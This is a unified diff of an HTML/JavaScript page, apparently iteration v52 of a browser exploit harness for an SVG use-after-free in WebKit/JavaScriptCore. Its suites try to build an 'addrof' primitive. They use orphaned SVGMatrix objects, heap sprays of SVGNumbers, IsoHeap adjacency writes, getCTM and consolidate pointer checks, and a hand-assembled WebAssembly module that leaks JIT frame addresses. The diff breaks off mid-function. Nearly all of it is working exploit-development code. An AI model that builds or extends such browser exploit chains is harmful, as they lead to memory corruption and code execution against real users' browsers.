@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v51 — addrof Probes</title>
+<title>SVG UAF v52 — addrof Probes II</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -11,25 +11,29 @@ h2{color:#00ff88;margin:6px 0;font-size:14px}
 button{background:#1a1a2e;color:#00ff88;border:1px solid #00ff88;padding:6px 12px;font-family:monospace;font-size:12px;cursor:pointer;border-radius:3px}
 button:active{background:#00ff88;color:#0a0a0a}
 button.run-all{background:#003300;border-color:#00ff88;font-weight:bold}
+button.copy-btn{background:#1a1a2e;border-color:#00aaff;color:#00aaff}
+button.copy-btn:active{background:#00aaff;color:#0a0a0a}
 button.clear-btn{border-color:#ff4444;color:#ff4444}
 #out{border:1px solid #222;padding:8px;min-height:100px;max-height:70vh;overflow-y:auto}
 pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 .hit{color:#00ff88}.miss{color:#ff4444}.warn{color:#ffaa00}.info{color:#888}
 .suite-hdr{color:#00aaff;margin-top:6px}
+#copy-toast{position:fixed;bottom:20px;right:20px;background:#00aaff;color:#000;padding:6px 14px;border-radius:4px;font-family:monospace;font-size:12px;opacity:0;transition:opacity 0.2s;pointer-events:none}
 </style>
 </head>
 <body>
-<h2>SVG UAF v51 — addrof Probes: OBJ3/OBJ4/OBJ6</h2>
+<h2>SVG UAF v52 — addrof Probes II: ADR6/ADR7/ADR8/ADR9</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('OBJ3')">OBJ3: Wasm Memory</button>
-  <button onclick="runSuite('OBJ4')">OBJ4: Type Confusion</button>
-  <button onclick="runSuite('OBJ6')">OBJ6: Stack/toString Leak</button>
-  <button onclick="runSuite('OBJ7')">OBJ7: JSValue Oracle</button>
-  <button onclick="runSuite('OBJ8')">OBJ8: WeakRef/GC Timing</button>
+  <button onclick="runSuite('ADR6')">ADR6: getCTM Ptr</button>
+  <button onclick="runSuite('ADR7')">ADR7: Wasm JIT Stack</button>
+  <button onclick="runSuite('ADR8')">ADR8: SVGAnim Leak</button>
+  <button onclick="runSuite('ADR9')">ADR9: caller/callee</button>
+  <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
 <div id="out"></div>
+<div id="copy-toast">Copied!</div>
 <script>
 var SVG_NS='http://www.w3.org/2000/svg';
 function L(s,cls){
@@ -41,11 +45,30 @@ function L(s,cls){
   d.scrollTop=d.scrollHeight;
 }
 function clearOut(){document.getElementById('out').innerHTML='';}
+function copyAll(){
+  var lines=document.getElementById('out').querySelectorAll('pre');
+  var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
+  var toast=document.getElementById('copy-toast');
+  try{
+    navigator.clipboard.writeText(text).then(function(){
+      toast.style.opacity='1';
+      setTimeout(function(){toast.style.opacity='0';},1500);
+    }).catch(function(){fallbackCopy(text,toast);});
+  }catch(e){fallbackCopy(text,toast);}
+}
+function fallbackCopy(text,toast){
+  var ta=document.createElement('textarea');
+  ta.value=text;ta.style.cssText='position:fixed;top:-9999px;left:-9999px';
+  document.body.appendChild(ta);ta.select();
+  try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}
+  catch(e){L('Copy failed: '+e.message,'miss');}
+  document.body.removeChild(ta);
+}
 
-// helpers
+// ── shared helpers ──────────────────────────────────────────────
 function makeSVG(){
   var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','1');svg.setAttribute('height','1');
+  svg.setAttribute('width','2');svg.setAttribute('height','2');
   svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
   document.body.appendChild(svg);
   return svg;
@@ -54,507 +77,487 @@ function removeSVG(svg){if(svg&&svg.parentNode)svg.parentNode.removeChild(svg);}
 var _tmp=null;
 function getTmp(){if(!_tmp){_tmp=document.createElementNS(SVG_NS,'svg');document.body.appendChild(_tmp);}return _tmp;}
 
-// float64 bit ops
 var _dv=new DataView(new ArrayBuffer(8));
-function f64bits(f){_dv.setFloat64(0,f,false);return{hi:_dv.getUint32(0,false),lo:_dv.getUint32(4,false)};}
-function bits2f64(hi,lo){_dv.setUint32(0,hi,false);_dv.setUint32(4,lo,false);return _dv.getFloat64(0,false);}
+function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
 function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
+function isPointerLike(f){
+  // arm64 heap: usually 0x100000000 – 0x1ffffffffff (37-ish bits)
+  // but also ASLR slide puts things in 0x10...–0x1ff...
+  if(!isFinite(f)||f<=0)return false;
+  var b=f64bits(f);
+  // pointer-like: value between 2^30 and 2^44
+  return f>=(1<<30)&&f<Math.pow(2,44);
+}
 
-// SVGMatrix oracle (confirmed v50)
 function getOrphanedMatrix(){
   var svg=makeSVG();
   var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
-  var xf=svg.createSVGTransform();
-  g.transform.baseVal.appendItem(xf);
+  var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
   var m=g.transform.baseVal.getItem(0).matrix;
   g.transform.baseVal.removeItem(0);
-  g.parentNode.removeChild(g);
-  removeSVG(svg);
+  g.parentNode.removeChild(g);removeSVG(svg);
   return m;
 }
 function echoK(K){
-  // write a=1/K, d=K, b=c=e=f=0 → inv.a = K
   var m=getOrphanedMatrix();
   m.a=1/K;m.b=0;m.c=0;m.d=K;m.e=0;m.f=0;
   return m.inverse().a;
 }
 
 // ─────────────────────────────────────────────────────────────────
-// OBJ3 — WebAssembly.Memory backing store probe
-// Wasm linear memory is allocated via mmap (separate from JSC heap)
-// memory.buffer is an ArrayBuffer — its backing pointer is at a fixed
-// offset in the JSC ArrayBuffer object structure
-// Test: can we detect the backing store address via any side-channel?
+// ADR6 — getCTM / getScreenCTM pointer leak
+// getCTM() returns an SVGMatrix whose e/f fields are translation values
+// computed from CSS layout. BUT: the C++ code that builds this matrix
+// passes through internal AffineTransform objects.
+// If any internal ptr bleeds into an unused matrix field (a/b/c/d when
+// identity), we get a real heap address.
+//
+// Variant: SVGTransformList.consolidate() builds a new SVGMatrix from
+// the list. Does the returned matrix wrapper point to a fresh C++ object
+// whose address we can infer?
+//
+// Also test: SVGSVGElement.createSVGMatrix() — does it reuse a pooled
+// C++ object from a known IsoHeap slot?
 // ─────────────────────────────────────────────────────────────────
-function runOBJ3(){
-  L('','suite-hdr');L('OBJ3: WebAssembly.Memory backing store probe');
+function runADR6(){
+  L('','suite-hdr');L('ADR6: getCTM / getScreenCTM / consolidate pointer leak');
 
-  if(typeof WebAssembly==='undefined'){L('OBJ3: WebAssembly not available','miss');return;}
-
-  // Create a Wasm memory
-  var mem=new WebAssembly.Memory({initial:1}); // 1 page = 64KB
-  var buf=mem.buffer;
-  L('OBJ3: mem.buffer.byteLength='+buf.byteLength+' ('+buf.byteLength/1024+'KB)');
-  L('OBJ3: buf instanceof ArrayBuffer='+(buf instanceof ArrayBuffer));
-  L('OBJ3: buf instanceof SharedArrayBuffer='+(buf instanceof SharedArrayBuffer));
-
-  // Write a canary to Wasm memory
-  var u8=new Uint8Array(buf);
-  u8[0]=0xDE;u8[1]=0xAD;u8[2]=0xBE;u8[3]=0xEF;
-  L('OBJ3: wrote canary 0xDEADBEEF at offset 0');
-
-  // Grow memory — does the buffer pointer change?
-  try{
-    mem.grow(1); // grow by 1 page
-    var buf2=mem.buffer; // new buffer after grow
-    var u82=new Uint8Array(buf2);
-    L('OBJ3: after grow(1): byteLength='+buf2.byteLength);
-    L('OBJ3: buf===buf2: '+(buf===buf2)+' (expect false — grows replace buffer)');
-    // Check if old buffer is detached
-    L('OBJ3: old buf.byteLength after grow: '+buf.byteLength+' (0=detached)');
-    // Check canary in new buffer
-    L('OBJ3: canary in new buf: 0x'+u82[0].toString(16)+u82[1].toString(16)+u82[2].toString(16)+u82[3].toString(16));
-  }catch(ex){L('OBJ3: grow failed: '+ex.message,'warn');}
-
-  // Try to get backing store address via DataView
-  // The ArrayBuffer object in JSC has: [header][butterfly ptr][backing store ptr][byteLength]
-  // We can't directly read JSC internals from JS without a confusion primitive
-  // BUT: we can probe alignment
-  var mem2=new WebAssembly.Memory({initial:4}); // 4 pages = 256KB
-  var buf3=mem2.buffer;
-  var u32=new Uint32Array(buf3);
-  // Write pattern to detect if Wasm memory overlaps with anything interesting
-  for(var i=0;i<16;i++) u32[i]=0xAAAA0000+i;
-  L('OBJ3: wrote pattern to Wasm memory[0..15]');
-
-  // Spray SVGNumbers — do any of them reflect Wasm memory?
-  // This would indicate shared address space visibility
   var svg=makeSVG();
-  var f=document.createElementNS(SVG_NS,'feColorMatrix');
-  f.setAttribute('type','matrix');
-  f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','fw1');
-  filt.appendChild(f);svg.appendChild(filt);
-  var bl=f.values.baseVal;bl.clear();
-  // Spray 100 SVGNumbers with known values
-  var refs=[];
-  for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=1000+i;bl.appendItem(n);refs.push(bl.getItem(bl.length-1));}
-  filt.parentNode.removeChild(filt); // orphan
+  // Place svg on-screen with known position so getCTM is meaningful
+  svg.style.cssText='position:fixed;top:50px;left:50px;width:200px;height:200px';
+  svg.setAttribute('width','200');svg.setAttribute('height','200');
 
-  // Check if any SVGNumber values changed to match Wasm pattern
-  var wasm_hit=false;
-  for(var i=0;i<refs.length;i++){
-    var v=refs[i].value;
-    if(v!==1000+i){wasm_hit=true;L('OBJ3: ★ SVGNumber['+i+'] changed: was='+(1000+i)+' got='+v,'hit');}
-  }
-  if(!wasm_hit) L('OBJ3: no Wasm/SVGNumber overlap detected');
+  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
+  var rect=document.createElementNS(SVG_NS,'rect');
+  rect.setAttribute('x','10');rect.setAttribute('y','10');
+  rect.setAttribute('width','50');rect.setAttribute('height','50');
+  g.appendChild(rect);
 
-  // Try: SharedArrayBuffer (may be blocked by COOP/COEP)
+  // Force layout
+  void svg.getBoundingClientRect();
+
+  // getCTM on rect
   try{
-    var sab=new SharedArrayBuffer(65536);
-    L('OBJ3: SharedArrayBuffer available! byteLength='+sab.byteLength,'hit');
-    // If SAB available, Atomics.wait/waitAsync timing might work
-    L('OBJ3: Atomics available='+(typeof Atomics!=='undefined'));
-  }catch(ex){
-    L('OBJ3: SharedArrayBuffer blocked: '+ex.message);
-  }
+    var ctm=rect.getCTM();
+    if(ctm){
+      L('ADR6: [getCTM] a='+ctm.a+' b='+ctm.b+' c='+ctm.c+' d='+ctm.d+' e='+ctm.e+' f='+ctm.f);
+      var fields={a:ctm.a,b:ctm.b,c:ctm.c,d:ctm.d,e:ctm.e,f:ctm.f};
+      for(var k in fields){
+        var v=fields[k];
+        if(isPointerLike(v)) L('ADR6: ★ getCTM.'+k+'='+v+' PTR-LIKE bits='+f64hex(v),'hit');
+      }
+      // e/f are translation (expected = 50+10=60, 50+10=60 relative to viewport)
+      L('ADR6: [getCTM] e and f are layout translation — expected');
+      // a/b/c/d should be 1/0/0/1 for no-transform — check
+      L('ADR6: [getCTM] identity check: a===1: '+(ctm.a===1)+' b===0: '+(ctm.b===0)+' c===0: '+(ctm.c===0)+' d===1: '+(ctm.d===1));
+    }else{
+      L('ADR6: getCTM() returned null','warn');
+    }
+  }catch(ex){L('ADR6: getCTM threw: '+ex.message,'miss');}
 
-  // Report Wasm memory address range indirectly via timing
-  // Allocate many Wasm memories, see if any SVGNumbers reflect changes
-  L('OBJ3: done');
-  removeSVG(svg);
-}
+  // getScreenCTM
+  try{
+    var sctm=rect.getScreenCTM();
+    if(sctm){
+      L('ADR6: [getScreenCTM] a='+sctm.a+' b='+sctm.b+' c='+sctm.c+' d='+sctm.d+' e='+sctm.e+' f='+sctm.f);
+      var sfields={a:sctm.a,b:sctm.b,c:sctm.c,d:sctm.d,e:sctm.e,f:sctm.f};
+      for(var k in sfields){
+        var v=sfields[k];
+        if(isPointerLike(v)) L('ADR6: ★ getScreenCTM.'+k+'='+v+' PTR-LIKE bits='+f64hex(v),'hit');
+      }
+    }
+  }catch(ex){L('ADR6: getScreenCTM threw: '+ex.message,'miss');}
 
-// ─────────────────────────────────────────────────────────────────
-// OBJ4 — Type Confusion via IsoHeap spray
-// IsoHeap is bump-only: allocation order = memory layout
-// If we spray SVGNumber objects then free them (orphan) and spray
-// a DIFFERENT type that has the same size → same IsoHeap bucket?
-// No — IsoHeap is PER C++ TYPE. But: can we spray enough of one type
-// to probe if a DIFFERENT type lands adjacently in a different IsoHeap?
-//
-// Real approach: find two C++ types with same sizeof that share a
-// fastMalloc bucket. Neither SVGNumber nor SVGMatrix uses fastMalloc
-// for their array items — they use IsoHeap.
-//
-// Sub-approach: JSC JSObject butterfly is fastMalloc.
-// If we allocate a JS array, its butterfly (property storage) is
-// allocated via fastMalloc. fastMalloc ZEROES on alloc (confirmed v48).
-// BUT: after zeroing, we can write to it via normal JS.
-// Can we get a JSC butterfly pointer into an SVGMatrix field?
-//
-// BUTTERFLY PROBE: alloc many JS objects, free them (set null),
-// alloc SVGNumbers → if IsoHeap and fastMalloc share any region,
-// a butterfly ptr might appear in SVGNumber.value (as float32 bits)
-// ─────────────────────────────────────────────────────────────────
-function runOBJ4(){
-  L('','suite-hdr');L('OBJ4: Type Confusion / IsoHeap spray probe');
+  // consolidate() — builds a new SVGMatrix from transform list
+  try{
+    var xf=svg.createSVGTransform();
+    xf.setTranslate(100,200);
+    g.transform.baseVal.appendItem(xf);
+    var cons=g.transform.baseVal.consolidate();
+    if(cons){
+      var cm=cons.matrix;
+      L('ADR6: [consolidate] a='+cm.a+' b='+cm.b+' c='+cm.c+' d='+cm.d+' e='+cm.e+' f='+cm.f);
+      var cfields={a:cm.a,b:cm.b,c:cm.c,d:cm.d,e:cm.e,f:cm.f};
+      for(var k in cfields){
+        var v=cfields[k];
+        if(isPointerLike(v)&&v!==100&&v!==200) L('ADR6: ★ consolidate.'+k+'='+v+' PTR-LIKE','hit');
+      }
+    }
+  }catch(ex){L('ADR6: consolidate threw: '+ex.message,'miss');}
 
-  // Test 1: Spray JS objects, then spray SVGNumbers, look for ptr artifacts
-  L('OBJ4: [Test 1] JS object spray → SVGNumber spray, looking for ptr artifacts');
-
-  // Spray 10000 JS objects to fill fastMalloc pages
-  var objs=[];
-  for(var i=0;i<10000;i++) objs.push({x:i,y:i*2,z:i*3});
-  // Free half of them
-  for(var i=0;i<5000;i++) objs[i]=null;
-  // Trigger GC hint
-  try{if(typeof gc==='function')gc();}catch(e){}
-
-  // Now spray SVGNumbers
-  var svg=makeSVG();
-  var fcms=[];
-  for(var k=0;k<5;k++){
+  // createSVGMatrix from svg root — check if it's a fresh C++ object
+  // After orphaning 500 SVGNumbers to fill IsoHeap pages, does a new
+  // SVGMatrix land at a predictable offset?
+  L('ADR6: [IsoHeap slot probe] spray SVGNumbers then alloc SVGMatrix...');
+  var fcm_refs=[];
+  for(var k=0;k<3;k++){
+    var svg2=makeSVG();
     var f=document.createElementNS(SVG_NS,'feColorMatrix');
     f.setAttribute('type','matrix');f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-    var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','fo'+k);
-    filt.appendChild(f);svg.appendChild(filt);
+    var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','a6f'+k);
+    filt.appendChild(f);svg2.appendChild(filt);
     var bl=f.values.baseVal;bl.clear();
-    var refs=[];
-    for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=0;bl.appendItem(n);refs.push(bl.getItem(bl.length-1));}
-    filt.parentNode.removeChild(filt);
-    fcms.push({refs:refs});
+    for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=5000+k*100+i;bl.appendItem(n);fcm_refs.push(bl.getItem(bl.length-1));}
+    filt.parentNode.removeChild(filt);removeSVG(svg2);
   }
-
-  // Check if any SVGNumber.value is nonzero (would indicate ptr bits leaked in as float32)
-  var artifacts=0;
-  for(var k=0;k<fcms.length;k++){
-    for(var i=0;i<fcms[k].refs.length;i++){
-      var v=fcms[k].refs[i].value;
-      if(v!==0){
-        artifacts++;
-        if(artifacts<=5) L('OBJ4: artifact! fcm['+k+']['+i+']='+v+' bits='+f64hex(v),'hit');
-      }
-    }
+  // Now alloc a new SVGTransform and get its matrix
+  var svg3=makeSVG();
+  var g3=document.createElementNS(SVG_NS,'g');svg3.appendChild(g3);
+  var xf3=svg3.createSVGTransform();g3.transform.baseVal.appendItem(xf3);
+  var m3=g3.transform.baseVal.getItem(0).matrix;
+  // Write to m3, check if any SVGNumber changed (would mean adjacency)
+  m3.a=0xdeadbeef;m3.b=0xcafebabe;m3.c=0xfeedface;m3.d=0xbaadf00d;
+  var bleed=0;
+  for(var i=0;i<fcm_refs.length;i++){
+    var v=fcm_refs[i].value;
+    var expected=5000+Math.floor(i/20)*100+(i%20);
+    if(v!==expected){bleed++;L('ADR6: bleed! ref['+i+']: expected='+expected+' got='+v+' hex='+f64hex(v),'hit');}
   }
-  L('OBJ4: artifacts found: '+artifacts+' (nonzero values in zeroed SVGNumbers)');
-  L('OBJ4: '+(artifacts>0?'★ POINTER BITS LEAKED into SVGNumber.value!':'no artifacts — fastMalloc zeroes confirmed'));
+  L('ADR6: bleed count='+bleed+'/'+fcm_refs.length+(bleed>0?' ★ HEAP ADJACENCY!':'no adjacency'));
 
-  // Test 2: SVGMatrix adjacent to SVGNumber probe
-  // After SVGNumber IsoHeap spray, alloc SVGTransform
-  // If SVGMatrix C++ object lands adjacent to SVGNumber C++ objects...
-  // write to SVGMatrix fields, check if any SVGNumber.value changed
-  L('OBJ4: [Test 2] SVGMatrix adjacency to SVGNumber spray');
-
-  var svg2=makeSVG();
-  // First spray SVGNumbers to fill IsoHeap pages
-  var numRefs=[];
-  var f2=document.createElementNS(SVG_NS,'feColorMatrix');
-  f2.setAttribute('type','matrix');f2.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-  var filt2=document.createElementNS(SVG_NS,'filter');filt2.setAttribute('id','fo2x');
-  filt2.appendChild(f2);svg2.appendChild(filt2);
-  var bl2=f2.values.baseVal;bl2.clear();
-  for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=3000+i;bl2.appendItem(n);numRefs.push(bl2.getItem(bl2.length-1));}
-  filt2.parentNode.removeChild(filt2);
-  // Now alloc SVGTransform (gets SVGMatrix)
-  var g2=document.createElementNS(SVG_NS,'g');svg2.appendChild(g2);
-  var xf2=svg2.createSVGTransform();g2.transform.baseVal.appendItem(xf2);
-  var m2=g2.transform.baseVal.getItem(0).matrix;
-  // Write large value to m2.a (float64)
-  m2.a=1e30;m2.b=2e30;m2.c=3e30;m2.d=4e30;m2.e=5e30;m2.f=6e30;
-  // Check if any SVGNumber changed
-  var changed=0;
-  for(var i=0;i<numRefs.length;i++){
-    var v=numRefs[i].value;
-    if(v!==3000+i){changed++;L('OBJ4: [T2] numRef['+i+'] changed: was='+(3000+i)+' got='+v,'hit');}
-  }
-  L('OBJ4: [T2] changed='+changed+'/20 '+(changed>0?'★ ADJACENCY WRITE-THROUGH!':'no adjacency'));
-
-  // Test 3: DOMMatrix → JSC confusion probe
-  // DOMMatrix is a JS-native object (not SVG C++)
-  // Its internal storage: each field is a C++ double
-  // The JSC wrapper for DOMMatrix uses a different memory region than SVGMatrix
-  // Can we find ANY object whose address appears in a DOMMatrix field?
-  L('OBJ4: [Test 3] DOMMatrix field zero-read probe');
-  var dm=new DOMMatrix();
-  // Read all fields BEFORE writing — should all be identity values (0 or 1)
-  var identity_fields=['a','b','c','d','e','f','m11','m12','m13','m14','m21','m22','m23','m24','m31','m32','m33','m34','m41','m42','m43','m44'];
-  var nonzero=[];
-  for(var i=0;i<identity_fields.length;i++){
-    var v=dm[identity_fields[i]];
-    if(v!==0&&v!==1) nonzero.push({f:identity_fields[i],v:v});
-  }
-  L('OBJ4: [T3] DOMMatrix() initial non-identity fields: '+nonzero.length);
-  for(var i=0;i<nonzero.length;i++) L('OBJ4: [T3] '+nonzero[i].f+'='+nonzero[i].v);
-
-  removeSVG(svg);removeSVG(svg2);
+  removeSVG(svg);removeSVG(svg3);
+  L('ADR6: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
-// OBJ6 — Stack / toString / Error address leak
-// Some JSC versions historically leaked object addresses in:
-// - Error.stack (line numbers, function addresses)
-// - Function.prototype.toString()
-// - Object.prototype.toString()
-// - Performance timing (Spectre residue)
-// - RegExp lastIndex
-// ─────────────────────────────────────────────────────────────────
-function runOBJ6(){
-  L('','suite-hdr');L('OBJ6: Error.stack / toString / timing address leak');
-
-  // Test 1: Error.stack
-  var e=new Error('test');
-  var stack=e.stack||'(no stack)';
-  L('OBJ6: [T1] Error.stack:');
-  // Print first 500 chars
-  L(stack.slice(0,500));
-  // Look for hex patterns that look like addresses (0x1[0-9a-f]{8,})
-  var hex_matches=stack.match(/0x[0-9a-f]{8,}/gi)||[];
-  L('OBJ6: [T1] hex patterns in stack: '+hex_matches.length);
-  for(var i=0;i<hex_matches.length;i++) L('OBJ6: [T1] found: '+hex_matches[i],'hit');
-
-  // Test 2: Function.prototype.toString
-  function testFn(){}
-  var fnStr=testFn.toString();
-  L('OBJ6: [T2] Function.toString(): '+fnStr.slice(0,100));
-  var fnHex=fnStr.match(/0x[0-9a-f]{6,}/gi)||[];
-  L('OBJ6: [T2] hex in fn.toString: '+fnHex.length);
-
-  // Test 3: native function toString (may reveal JIT addresses)
-  var nativeStr=Math.sin.toString();
-  L('OBJ6: [T3] Math.sin.toString(): '+nativeStr);
-  var nativeHex=nativeStr.match(/0x[0-9a-f]{6,}/gi)||[];
-  L('OBJ6: [T3] hex in native fn: '+nativeHex.length+(nativeHex.length>0?' ★ '+nativeHex[0]:''));
-
-  // Test 4: Error.lineNumber / columnNumber / fileName
-  try{null.x;}catch(e2){
-    L('OBJ6: [T4] caught error: '+e2.message);
-    L('OBJ6: [T4] lineNumber='+e2.lineNumber+' column='+e2.column+' fileName='+e2.fileName);
-    L('OBJ6: [T4] stack='+((e2.stack||'').slice(0,200)));
-  }
-
-  // Test 5: performance.now() precision (Spectre residue check)
-  var times=[];
-  for(var i=0;i<10;i++) times.push(performance.now());
-  L('OBJ6: [T5] performance.now() samples: '+times.slice(0,5).map(function(t){return t.toFixed(6);}).join(', '));
-  L('OBJ6: [T5] resolution: '+(times[1]-times[0]).toFixed(9)+'ms');
-
-  // Test 6: RegExp lastIndex leak (historical JSC bug)
-  var re=/(a+)+$/;
-  var testStr='aaaaaaaaaaaaaaaa!';
-  try{
-    re.test(testStr);
-    L('OBJ6: [T6] RegExp.lastIndex='+re.lastIndex);
-  }catch(ex){L('OBJ6: [T6] regex threw: '+ex.message);}
-
-  // Test 7: Symbol description / well-known symbols
-  var sym=Symbol('test');
-  L('OBJ6: [T7] Symbol.toString()='+sym.toString());
-
-  // Test 8: ArrayBuffer address probe via DataView offset trick
-  // Create two ArrayBuffers back to back, measure if indices overlap
-  var ab1=new ArrayBuffer(256);
-  var ab2=new ArrayBuffer(256);
-  var dv1=new DataView(ab1);
-  var dv2=new DataView(ab2);
-  dv1.setUint32(0,0xDEADBEEF,true);
-  dv2.setUint32(0,0xCAFEBABE,true);
-  // If ab2 is adjacent to ab1, writing past ab1's end would affect ab2
-  // We can't do OOB write in JS normally — but we have orphaned SVGMatrix!
-  // This is the key: use SVGMatrix float64 write on orphaned C++ object
-  // to see if it bleeds into adjacent ArrayBuffer
-  L('OBJ6: [T8] ArrayBuffer adjacency via SVGMatrix write...');
-  // Can't directly — would need to know addresses. Skip for now.
-  L('OBJ6: [T8] skipped (needs addrof first)');
-
-  // Test 9: JSC JIT code address via exception handling
-  // Some engines expose code addresses through .stack line numbers
-  // that correlate with JIT-compiled function addresses
-  function jitMe(x){
-    // Force JIT compilation with a hot loop
-    var sum=0;
-    for(var i=0;i<1000;i++) sum+=x*i;
-    return sum;
-  }
-  for(var i=0;i<100;i++) jitMe(i); // warm up
-  try{
-    var jitErr=null;
-    (function(){try{null.x;}catch(e){jitErr=e;}})();
-    if(jitErr&&jitErr.stack){
-      var jitHex=(jitErr.stack.match(/0x[0-9a-f]{8,}/gi)||[]);
-      L('OBJ6: [T9] JIT error stack hex: '+jitHex.length+(jitHex.length>0?' first: '+jitHex[0]:''));
-    }
-  }catch(ex){}
-
-  L('OBJ6: done');
-}
-
-// ─────────────────────────────────────────────────────────────────
-// OBJ7 — JSValue oracle
-// In JSC, JS values are NaN-boxed 64-bit values.
-// Double: stored directly. Object ptr: upper bits = 0xFFFF (or tag)
-// Can we use SVGMatrix.inverse() to decode a JSValue?
+// ADR7 — Wasm JIT stack frame address leak
+// Compile a minimal Wasm module. Wasm functions get JIT-compiled
+// stub addresses. If an exception thrown INSIDE a Wasm call stack
+// includes the Wasm JIT frame addresses in Error.stack, we get
+// real code addresses — still useful (text segment, not heap, but
+// confirms ASLR slide which narrows heap range via known offsets).
 //
-// Approach: get a JS object "into" an SVGMatrix field somehow.
-// JSC Float64Array: each element IS a raw float64 in memory.
-// Float64Array[0] = arbitrary f64 bits.
-// If we can alias Float64Array's backing store with SVGMatrix fields...
+// Also: Wasm table element pointers, Wasm global pointers
 // ─────────────────────────────────────────────────────────────────
-function runOBJ7(){
-  L('','suite-hdr');L('OBJ7: JSValue / Float64Array oracle probe');
+function runADR7(){
+  L('','suite-hdr');L('ADR7: Wasm JIT stack frame / table / global address leak');
 
-  // Test 1: Float64Array stores exact float64 bits
-  var fa=new Float64Array(8);
-  fa[0]=1/3;
-  L('OBJ7: [T1] Float64Array stores f64: '+fa[0]+' exact='+(fa[0]===1/3));
+  if(typeof WebAssembly==='undefined'){L('ADR7: WebAssembly unavailable','miss');return;}
 
-  // Test 2: write NaN bits to Float64Array, read back
-  // In JSC, object references are NaN-boxed: 0xFFFF000000000000 | ptr
-  // A "poisoned NaN" f64 would have upper bits = 0xFFFF
-  var nan_val=NaN;
-  fa[0]=nan_val;
-  var dv=new DataView(fa.buffer);
-  var nan_hi=dv.getUint32(0,false);var nan_lo=dv.getUint32(4,false);
-  L('OBJ7: [T2] NaN bits: hi=0x'+nan_hi.toString(16)+' lo=0x'+nan_lo.toString(16));
+  // Minimal Wasm module that:
+  // 1. exports a function that calls an imported JS function (which throws)
+  // 2. exports a global (i32)
+  // 3. exports a table
+  //
+  // WAT (text format), hand-assembled to bytes:
+  // (module
+  //   (import "env" "js_throw" (func $js_throw))
+  //   (func $call_throw (export "call_throw") call $js_throw)
+  //   (global $g (export "g") i32 (i32.const 0xdeadbeef))
+  //   (table (export "t") 1 funcref)
+  //   (elem (i32.const 0) $call_throw)
+  // )
+  var wasmBytes=new Uint8Array([
+    0x00,0x61,0x73,0x6d, // magic
+    0x01,0x00,0x00,0x00, // version
+    // type section: 2 types: () -> () , () -> ()
+    0x01,0x05,0x02,0x60,0x00,0x00,0x60,0x00,0x00,
+    // import section: env.js_throw : type 0
+    0x02,0x0d,0x01,0x03,0x65,0x6e,0x76,0x08,0x6a,0x73,0x5f,0x74,0x68,0x72,0x6f,0x77,0x00,0x00,
+    // function section: 1 function of type 1
+    0x03,0x02,0x01,0x01,
+    // table section: 1 table, funcref, min=1
+    0x04,0x04,0x01,0x70,0x00,0x01,
+    // global section: 1 global i32 const 0xdeadbeef
+    0x06,0x06,0x01,0x7f,0x00,0x41,0xef,0xfd,0xb7,0x76,0x0b,
+    // export section: call_throw, g, t
+    0x07,0x1a,0x03,
+      0x0a,0x63,0x61,0x6c,0x6c,0x5f,0x74,0x68,0x72,0x6f,0x77,0x00,0x01, // call_throw=func 1
+      0x01,0x67,0x03,0x00,  // g=global 0
+      0x01,0x74,0x01,0x00,  // t=table 0
+    // element section: elem at offset 0, func 1
+    0x09,0x07,0x01,0x00,0x41,0x00,0x0b,0x01,0x01,
+    // code section: func body = call 0 (import) then end
+    0x0a,0x06,0x01,0x04,0x00,0x10,0x00,0x0b,
+  ]);
 
-  // Test 3: write various "tagged" bit patterns to Float64Array
-  // JSC pointer encoding: doubles are stored as-is if they're valid doubles
-  // Objects are encoded as: 0xFFFF000000000000 | 32-bit ptr (on 32-bit)
-  // On 64-bit arm64: pointers are 48-bit, encoded differently
-  // JSC on arm64 uses: if bits are a valid f64, it's a double
-  //                    if upper 16 bits = 0xFFFF, it's an object ptr
-  var jsval_patterns=[
-    {hi:0xFFFF0000,lo:0x00001234,name:'JSC obj-ptr-like (32-bit style)'},
-    {hi:0xFFFC0000,lo:0x00000000,name:'JSC NaN tag'},
-    {hi:0x00000000,lo:0x00000001,name:'small int as f64'},
-  ];
-  for(var i=0;i<jsval_patterns.length;i++){
-    var p=jsval_patterns[i];
-    dv.setUint32(0,p.hi,false);dv.setUint32(4,p.lo,false);
-    var got=fa[0];
-    L('OBJ7: [T3] pattern '+p.name+': hi=0x'+p.hi.toString(16)+' lo=0x'+p.lo.toString(16)+' → f64='+got+' isNaN='+isNaN(got)+' isFinite='+isFinite(got));
-  }
+  var thrownErr=null;
+  WebAssembly.instantiate(wasmBytes,{
+    env:{
+      js_throw:function(){
+        // throw from inside Wasm call
+        throw new Error('wasm_inner_throw');
+      }
+    }
+  }).then(function(result){
+    var inst=result.instance;
